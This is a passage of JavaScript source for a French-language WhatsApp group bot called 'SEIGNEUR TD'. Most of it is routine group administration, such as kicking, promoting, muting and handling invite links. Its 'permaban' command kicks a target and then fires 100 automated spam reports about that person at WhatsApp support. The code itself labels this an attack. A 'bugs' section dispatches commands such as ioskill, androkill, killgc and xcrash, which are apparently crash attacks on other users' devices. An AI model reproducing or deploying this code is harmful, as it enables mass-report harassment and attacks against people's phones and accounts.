            warnText += `${index + 1}. ${warn.reason}\n   📅 ${date}\n\n`;
          });
          
          await sock.sendMessage(remoteJid, {
            text: warnText,
            mentions: [mentionedWarns]
          });
        }
        break;

      case 'acceptall':
      case 'accept-all':
      case 'acceptrequests':
      case 'approuver': {
        if(!isGroup){await sock.sendMessage(remoteJid,{text:'❌ Groupes seulement.'},{ quoted: message });break;}
        const _isAdminAcc=await isGroupAdmin(sock,remoteJid,senderJid);
        if(!_isAdminAcc&&!isOwner && !isAdmin(senderJid)){await sock.sendMessage(remoteJid,{text:'⛔ Admin requis.'},{ quoted: message });break;}
        const _botIsAdminAcc=await isBotGroupAdmin(sock,remoteJid);
        if(!_botIsAdminAcc){await sock.sendMessage(remoteJid,{text:'❌ Le bot doit être admin.'},{ quoted: message });break;}
        try{
          let _pending=[];
          try{_pending=await sock.groupRequestParticipantsList(remoteJid);}catch(e){}
          if(!_pending||!_pending.length){
            const _meta=await sock.groupMetadata(remoteJid);
            const _raw=(_meta.participants||[]).filter(p=>p.pending===true||p.request_method==='invite').map(p=>({jid:p.id}));
            if(_raw.length)_pending=_raw;
          }
          if(!_pending||!_pending.length){await sock.sendMessage(remoteJid,{text:'📭 Aucune demande en attente.'},{ quoted: message });break;}
          await sock.sendMessage(remoteJid,{text:'⏳ Acceptation de '+_pending.length+' demande(s)...'},{ quoted: message });
          const _jids=_pending.map(p=>p.jid);
          let _accepted=0;
          for(let i=0;i<_jids.length;i+=20){
            const _batch=_jids.slice(i,i+20);
            try{await sock.groupRequestParticipantsUpdate(remoteJid,_batch,'approve');_accepted+=_batch.length;if(i+20<_jids.length)await new Promise(r=>setTimeout(r,1200));}catch(e){}
          }
          await sock.sendMessage(remoteJid,{text:'✅ '+_accepted+'/'+_pending.length+' demandes acceptées.'});
        }catch(e){await sock.sendMessage(remoteJid,{text:'❌ Erreur: '+e.message},{ quoted: message });}
        break;
      }

      case 'antiadmin': {
        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' }); break; }
        const _aaIsGroupAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isOwner && !isAdmin(senderJid) && !_aaIsGroupAdmin) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement.' }); break; }
        const _aaSettings = getGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          _aaSettings.antiadmin = true; groupSettings.set(remoteJid, _aaSettings); saveStoreKey('groupSettings');
          await sock.sendMessage(remoteJid, { text: `🛡️ *Anti-Admin* — ✅ ACTIVÉ

Toute tentative de promotion sera bloquée.

*© SEIGNEUR TD*` });
        } else if (args[0]?.toLowerCase() === 'off') {
          _aaSettings.antiadmin = false; groupSettings.set(remoteJid, _aaSettings); saveStoreKey('groupSettings');
          await sock.sendMessage(remoteJid, { text: `🛡️ *Anti-Admin* — ❌ DÉSACTIVÉ

*© SEIGNEUR TD*` });
        } else {
          await sock.sendMessage(remoteJid, { text: `🛡️ *Anti-Admin* — ${_aaSettings.antiadmin ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

💡 Usage: ${config.prefix}antiadmin on/off

*© SEIGNEUR TD*` });
        }
        break;
      }

      case 'antidemote': {
        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' }); break; }
        const _adIsGroupAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isOwner && !isAdmin(senderJid) && !_adIsGroupAdmin) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement.' }); break; }
        const _adSettings = getGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          _adSettings.antidemote = true; groupSettings.set(remoteJid, _adSettings); saveStoreKey('groupSettings');
          await sock.sendMessage(remoteJid, { text: `🛡️ *Anti-Demote* — ✅ ACTIVÉ

Toute tentative de rétrogradation sera bloquée.

*© SEIGNEUR TD*` });
        } else if (args[0]?.toLowerCase() === 'off') {
          _adSettings.antidemote = false; groupSettings.set(remoteJid, _adSettings); saveStoreKey('groupSettings');
          await sock.sendMessage(remoteJid, { text: `🛡️ *Anti-Demote* — ❌ DÉSACTIVÉ

*© SEIGNEUR TD*` });
        } else {
          await sock.sendMessage(remoteJid, { text: `🛡️ *Anti-Demote* — ${_adSettings.antidemote ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

💡 Usage: ${config.prefix}antidemote on/off

*© SEIGNEUR TD*` });
        }
        break;
      }

      case 'promote':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminPromote = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminPromote && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminPromote = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminPromote) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour promouvoir' });
          break;
        }

        const mentionedPromote = getTargetJid(message);
        if (!mentionedPromote) {
          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedPromote], 'promote');
          await sock.sendMessage(remoteJid, {
            text: `👑 @${mentionedPromote.split('@')[0]} est maintenant admin!`,
            mentions: [mentionedPromote]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌  lors de la promotion' });
        }
        break;

      case 'demote':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminDemote = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminDemote && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminDemote = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminDemote) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour rétrograder' });
          break;
        }

        const mentionedDemote = getTargetJid(message);
        if (!mentionedDemote) {
          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedDemote], 'demote');
          await sock.sendMessage(remoteJid, {
            text: `📉 @${mentionedDemote.split('@')[0]} n'est plus admin`,
            mentions: [mentionedDemote]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌  lors de la rétrogradation' });
        }
        break;

      case 'add':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminAdd = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminAdd && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminAdd = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminAdd) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour ajouter des membres' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}add 33612345678`
          });
          break;
        }

        const numberToAdd = args[0].replace(/[^0-9]/g, '');
        if (numberToAdd.length < 10) {
          await sock.sendMessage(remoteJid, { text: '❌ Numéro invalide' });
          break;
        }

        try {
          const jidToAdd = `${numberToAdd}@s.whatsapp.net`;
          await sock.groupParticipantsUpdate(remoteJid, [jidToAdd], 'add');
          await sock.sendMessage(remoteJid, {
            text: `✅ @${numberToAdd} a été ajouté au groupe`,
            mentions: [jidToAdd]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: `❌ Unable d'ajouter ce numéro\nVérifiez:\n- Le numéro est correct\n- La personne n'a pas quitté récemment\n- Les paramètres de confidentialité` 
          });
        }
        break;

      case 'kick':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminKick = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminKick && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminKick = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminKick) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour expulser' });
          break;
        }

        const mentionedKick = getTargetJid(message);
        if (!mentionedKick) {
          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedKick], 'remove');
          await sock.sendMessage(remoteJid, {
            text: `👢 @${mentionedKick.split('@')[0]} a été expulsé`,
            mentions: [mentionedKick]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌  lors de l\'expulsion' });
        }
        break;

      case 'permaban':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminPermaBan = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminPermaBan && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminPermaBan = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminPermaBan) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour bannir' });
          break;
        }

        const mentionedBan = getTargetJid(message);
        if (!mentionedBan) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *PERMABAN - Bannissement Permanent*\n\nUtilisation:\n${config.prefix}permaban @user raison\n\nCette personne sera:\n• Expulsée du groupe\n• Signalée 100 fois à WhatsApp\n• Bloquée de rejoindre le groupe\n\n⚠️ : Cette action est irréversible pour le signalement!\n\nCommandes liées:\n${config.prefix}unpermaban @user - Retirer le ban\n${config.prefix}banlist - Voir la liste des bannis`
          });
          break;
        }

        const banReason = args.slice(1).join(' ') || 'Comportement inapproprié';
        
        // Vérifier si déjà banni
        if (isPermaBanned(remoteJid, mentionedBan)) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ @${mentionedBan.split('@')[0]} est déjà banni définitivement!`,
            mentions: [mentionedBan]
          });
          break;
        }

        try {
          // Message d'avertissement
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║    ⚠️ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗   ║
╚═══════════════════════════════════╝

🎯 : @${mentionedBan.split('@')[0]}
📝 Raison: ${banReason}
⚡ Action: Expulsion + Signalement massif

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ Initialisation de l'attaque...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
            mentions: [mentionedBan]
          });

          await delay(2000);

          // Expulser la personne
          await sock.groupParticipantsUpdate(remoteJid, [mentionedBan], 'remove');
          
          // Ajouter au permaban
          addPermaBan(remoteJid, mentionedBan, banReason, senderJid);
          
          // Message de progression
          const progressMsg = await sock.sendMessage(remoteJid, {
            text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: 0/100\n🎯 : @${mentionedBan.split('@')[0]}\n\n⏳ Please patienter...`,
            mentions: [mentionedBan]
          });

          // SIGNALEMENT MASSIF - 100 fois
          let reportCount = 0;
          const totalReports = 100;
          const batchSize = 10; // Signaler par batch de 10

          for (let i = 0; i < totalReports; i += batchSize) {
            try {
              // Batch de 
              for (let j = 0; j < batchSize && (i + j) < totalReports; j++) {
                try {
                  // Envoyer le signalement à WhatsApp
                  await sock.sendMessage('support@s.whatsapp.net', {
                    text: `Report spam from ${mentionedBan}`
                  });
                  
                  reportCount++;
                } catch (report) {
                  console.error(' sending report:', report);
                }
              }

              // Mise à jour de la progression toutes les 20 reports
              if (reportCount % 20 === 0 || reportCount === totalReports) {
                const percentage = Math.floor((reportCount / totalReports) * 100);
                const progressBar = '█'.repeat(Math.floor(percentage / 5)) + '░'.repeat(20 - Math.floor(percentage / 5));
                
                await sock.sendMessage(remoteJid, {
                  text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: ${reportCount}/${totalReports}\n[${progressBar}] ${percentage}%\n🎯 : @${mentionedBan.split('@')[0]}\n\n${reportCount === totalReports ? '✅ TERMINÉ!' : '⏳ ...'}`,
                  mentions: [mentionedBan],
                  edit: progressMsg.key
                });
              }

              // Délai pour éviter le rate limit
              if (i + batchSize < totalReports) {
                await delay(500);
              }
            } catch (error) {
              console.error(' in report batch:', error);
            }
          }

          // Message final
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║   ✅ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧   ║
╚═══════════════════════════════════╝

🎯 *:* @${mentionedBan.split('@')[0]}
📝 *Raison:* ${banReason}
👤 *Par:* @${senderJid.split('@')[0]}
📅 *Date:* ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ *ACTIONS EFFECTUÉES:*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ Expulsion du groupe
2️⃣ ${reportCount}  envoyés à WhatsApp
3️⃣ Bannissement permanent activé

⚠️ Cette personne sera automatiquement expulsée si elle rejoint à nouveau.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    SEIGNEUR TD
  "You remember me?"`,
            mentions: [mentionedBan, senderJid]
          });
          
          console.log(`✅ Permaban + ${reportCount} reports appliqués: ${mentionedBan} dans ${remoteJid}`);
        } catch (error) {
          console.error(' in permaban:', error);
          await sock.sendMessage(remoteJid, { 
            text: '❌  lors du bannissement. La personne a peut-être déjà quitté le groupe.' 
          });
        }
        break;

      case 'unpermaban':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminUnBan = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminUnBan && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedUnBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUnBan) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}unpermaban @user`
          });
          break;
        }

        if (!isPermaBanned(remoteJid, mentionedUnBan)) {
          await sock.sendMessage(remoteJid, {
            text: `ℹ️ @${mentionedUnBan.split('@')[0]} n'est pas banni.`,
            mentions: [mentionedUnBan]
          });
          break;
        }

        const banInfo = getPermaBanInfo(remoteJid, mentionedUnBan);
        removePermaBan(remoteJid, mentionedUnBan);
        
        await sock.sendMessage(remoteJid, {
          text: `✅ *PERMABAN RETIRÉ*\n\n@${mentionedUnBan.split('@')[0]} peut à nouveau rejoindre le groupe.\n\nBanni depuis: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nRaison du ban: ${banInfo.reason}\nRetiré par: @${senderJid.split('@')[0]}`,
          mentions: [mentionedUnBan, senderJid]
        });
        
        console.log(`✅ Permaban retiré: ${mentionedUnBan} dans ${remoteJid}`);
        break;

      case 'banlist':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const groupBans = getAllPermaBans(remoteJid);
        
        if (groupBans.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: '✅ Aucune personne bannie dans ce groupe.'
          });
          break;
        }

        let banListText = `╔═══════════════════════════════════╗
║     🚫 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗕𝗔𝗡𝗦     ║
╚═══════════════════════════════════╝

📊 Total: ${groupBans.length} personne(s) bannie(s)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

        groupBans.forEach((ban, index) => {
          const date = new Date(ban.timestamp).toLocaleDateString('fr-FR');
          banListText += `\n${index + 1}. @${ban.userJid.split('@')[0]}\n`;
          banListText += `   📝 Raison: ${ban.reason}\n`;
          banListText += `   📅 Date: ${date}\n`;
          banListText += `   👤 Par: @${ban.bannedBy.split('@')[0]}\n`;
        });

        banListText += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        banListText += `💡 Utilisez ${config.prefix}unpermaban @user pour retirer un ban`;

        const mentions = groupBans.flatMap(ban => [ban.userJid, ban.bannedBy]);

        await sock.sendMessage(remoteJid, {
          text: banListText,
          mentions: mentions
        });
        break;

      // =============================================
      // NOUVELLES COMMANDES GROUPE
      // =============================================

      case 'mute':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminMute = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminMute && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminMute = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminMute) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour mute' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'announcement');
          await sock.sendMessage(remoteJid, {
            text: '🔇 Groupe en mode *MUET*\n\nSeuls les admins peuvent envoyer des messages.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌  lors du mute' });
        }
        break;

      case 'unmute':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminUnmute = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminUnmute && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminUnmute = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminUnmute) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour unmute' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'not_announcement');
          await sock.sendMessage(remoteJid, {
            text: '🔊 Groupe en mode *OUVERT*\n\nTout le monde peut envoyer des messages.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌  lors du unmute' });
        }
        break;

      case 'invite':
      case 'lien':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const inviteCode = await sock.groupInviteCode(remoteJid);
          await sock.sendMessage(remoteJid, {
            text: `🔗 *Lien d'invitation du groupe*\n\nhttps://chat.whatsapp.com/${inviteCode}`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: '❌ Unable de récupérer le lien. Je dois être admin.' 
          });
        }
        break;

      case 'revoke':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminRevoke = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminRevoke && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupRevokeInvite(remoteJid);
          await sock.sendMessage(remoteJid, {
            text: '✅ Lien d\'invitation réinitialisé!\n\nL\'ancien lien ne fonctionne plus.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: '❌ . Je dois être admin.' 
          });
        }
        break;

      case 'glock':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGlock = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGlock && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'locked');
          await sock.sendMessage(remoteJid, {
            text: '🔒 Paramètres du groupe *VERROUILLÉS*\n\nSeuls les admins peuvent modifier les infos du groupe.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'gunlock':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGunlock = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGunlock && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'unlocked');
          await sock.sendMessage(remoteJid, {
            text: '🔓 Paramètres du groupe *DÉVERROUILLÉS*\n\nTout le monde peut modifier les infos du groupe.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'gname':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGname = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGname && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}gname <nouveau nom>`
          });
          break;
        }

        const newGroupName = args.join(' ');
        try {
          await sock.groupUpdateSubject(remoteJid, newGroupName);
          await sock.sendMessage(remoteJid, {
            text: `✅ Nom du groupe changé en:\n*${newGroupName}*`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'gdesc':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGdesc = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGdesc && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}gdesc <nouvelle description>`
          });
          break;
        }

        const newGroupDesc = args.join(' ');
        try {
          await sock.groupUpdateDescription(remoteJid, newGroupDesc);
          await sock.sendMessage(remoteJid, {
            text: `✅ Description du groupe modifiée!`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'groupinfo':
      case 'infos':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const admins = metadata.participants.filter(p => p.admin).length;
          const members = metadata.participants.length;
          const desc = metadata.desc || 'Aucune description';
          const owner = metadata.owner || 'Inconnu';
          const created = metadata.creation ? new Date(metadata.creation * 1000).toLocaleDateString('fr-FR') : 'Inconnu';

          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║      📊 𝗜𝗡𝗙𝗢𝗦 𝗚𝗥𝗢𝗨𝗣𝗘      ║
╚═══════════════════════════════════╝

📌 *Nom:* ${metadata.subject}

👥 *:* ${members}
👑 *:* ${admins}
🔐 *:* @${owner.split('@')[0]}
📅 *Créé le:* ${created}

📝 *:*
${desc}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    SEIGNEUR TD`,
            mentions: [owner]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'listonline':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          
          let onlineList = `╔═══════════════════════════════════╗
║    📱 𝗠𝗘𝗠𝗕𝗥𝗘𝗦 𝗘𝗡 𝗟𝗜𝗚𝗡𝗘    ║
╚═══════════════════════════════════╝

`;

          let count = 0;
          for (const participant of participants) {
            try {
              const status = await sock.fetchStatus(participant.id);
              if (status) {
                count++;
                onlineList += `${count}. @${participant.id.split('@')[0]}\n`;
              }
            } catch (e) {
              // Ignore les erreurs
            }
          }

          onlineList += `\n📊 Total: ${count} membre(s) en ligne`;

          await sock.sendMessage(remoteJid, {
            text: onlineList,
            mentions: participants.map(p => p.id)
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'jid':
        const jidToShow = isGroup ? senderJid : remoteJid;
        await sock.sendMessage(remoteJid, {
          text: `📱 *Votre JID:*\n\n\`${jidToShow}\`\n\nCopiez-le pour l'utiliser comme admin.`
        });
        break;

      case 'quoted':
      case 'q':
        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
          await sock.sendMessage(remoteJid, { text: '❌   ' });
          break;
        }

        const quotedMsg = message.message.extendedTextMessage.contextInfo.quotedMessage;
        const quotedText = quotedMsg.conversation || quotedMsg.extendedTextMessage?.text || 'Message sans texte';
        
        await sock.sendMessage(remoteJid, {
          text: `📝 *Message cité:*\n\n${quotedText}`
        });
        break;

      case 'check':
      case 'bancheck':
      case 'isban':
        await handleCheckBan(sock, args, remoteJid, senderJid, message);
        break;

      // =============================================
      // COMMANDES BUGS 🪲
      // =============================================

      case 'kill.gc':
      case 'killgc':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleKillGC(sock, args, remoteJid, senderJid, message);
        break;

      case 'ios.kill':
      case 'ioskill':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleIOSKill(sock, args, remoteJid, senderJid, message);
        break;

      case 'andro.kill':
      case 'androkill':
      case 'androidkill':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleAndroKill(sock, args, remoteJid, senderJid, message);
        break;

      case 'silent':
      case 'report':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleSilent(sock, args, remoteJid, senderJid, message);
        break;

      case 'bansupport':
      case 'bansupp':
      case 'xban':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleBanSupport(sock, args, remoteJid, senderJid, message);
        break;

      case 'xcrash':
      case 'megaban':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleMegaBan(sock, args, remoteJid, senderJid, message);
        break;

      case 'updatedev':
      case 'devupdate':
      case 'managedev':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleUpdateDev(sock, args, remoteJid, senderJid);
        break;

      case 'update':
      case 'maj':
      case 'upgrade': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins du bot uniquement.' });
          break;
        }
        await sock.sendMessage(remoteJid, {
          text: '🔄 *Mise à jour en cours...*\n\nVeuillez patienter minimum 30s.'
        }, { quoted: message });

        const { execSync, exec } = await import('child_process');
        const _repoUrl = 'https://github.com/Azountou235/SEIGNEUR-TD-.git';
        const _cwd = process.cwd();

        try {
          // Vérifier si git est disponible
          execSync('git --version', { stdio: 'ignore' });

          // Sauvegarder les fichiers config locaux
          const _filesToKeep = ['creds.json', '.env', 'database.json', 'session'];

          // Git pull
          const _gitOut = execSync('git pull origin main 2>&1 || git pull origin master 2>&1', {
            cwd: _cwd, encoding: 'utf8', timeout: 30000
          });

          const _isUpToDate = _gitOut.includes('Already up to date') || _gitOut.includes('up-to-date');

          if (_isUpToDate) {
            await sock.sendMessage(remoteJid, {
              text: '\u2705 *SEIGNEUR TD est d\u00E9j\u00E0 \u00E0 la derni\u00E8re version!*\n\n_Aucune mise \u00E0 jour disponible._'
            }, { quoted: message });
            break;
          }

          // npm install pour les nouvelles dépendances
          try {
            execSync('npm install --production 2>&1', { cwd: _cwd, encoding: 'utf8', timeout: 60000 });
          } catch(npmErr) {}

          await sock.sendMessage(remoteJid, {
            text: '✅ *Mise à jour réussie !* Redémarrage dans 3s...'
          });

          // Redémarrer après 3 secondes
          setTimeout(() => { process.exit(0); }, 3000);

        } catch(gitErr) {
          // Git non disponible → téléchargement direct via axios (compatible Pterodactyl)


          try {
            // Télécharger uniquement index.js depuis GitHub (raw)
            const rawUrl = 'https://raw.githubusercontent.com/Azountou235/SEIGNEUR-TD-/main/index.js';


            const rawResp = await axios.get(rawUrl, {
              responseType: 'text',
              timeout: 60000,
              headers: { 'User-Agent': 'Mozilla/5.0' }
            });

            if (!rawResp.data || rawResp.data.length < 1000) throw new Error('Fichier index.js vide ou trop petit');

            // Sauvegarder l'ancien index.js au cas où
            const _cwd2 = process.cwd();
            const indexPath = _cwd2 + '/index.js';
            const backupPath = _cwd2 + '/index.js.bak';
            if (fs.existsSync(indexPath)) fs.copyFileSync(indexPath, backupPath);

            // Écrire le nouveau index.js
            fs.writeFileSync(indexPath, rawResp.data, 'utf8');

            await sock.sendMessage(remoteJid, { text: '✅ *Mise à jour réussie !* Redémarrage dans 3s...' });

            setTimeout(() => { process.exit(0); }, 3000);

          } catch(dlErr) {
            await sock.sendMessage(remoteJid, {
              text:
`❌ *Échec de la mise à jour automatique*
────────────────────────
💡 Mets à jour manuellement depuis ton panel Pterodactyl.

_Erreur: ${dlErr.message}_`
            }, { quoted: message });
          }
        }
        break;
      }

      case 'storestatus':
      case 'storeinfo':
      case 'storesave':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }
        await handleStoreStatus(sock, remoteJid, command);
        break;

      // =============================================
